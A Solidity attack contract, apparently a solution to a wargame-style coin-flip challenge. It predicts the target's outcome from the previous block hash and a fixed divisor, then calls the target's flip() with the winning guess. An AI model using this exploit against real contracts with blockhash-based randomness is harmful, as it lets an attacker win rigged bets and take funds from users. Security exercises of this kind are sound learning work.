// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract CoinAttacker {

    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public coinFlipAddress;

    constructor(address _coinFlipAddress) {
        coinFlipAddress = _coinFlipAddress;
    }

    function flip() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        ICoinFlip(coinFlipAddress).flip(side);
    }
}
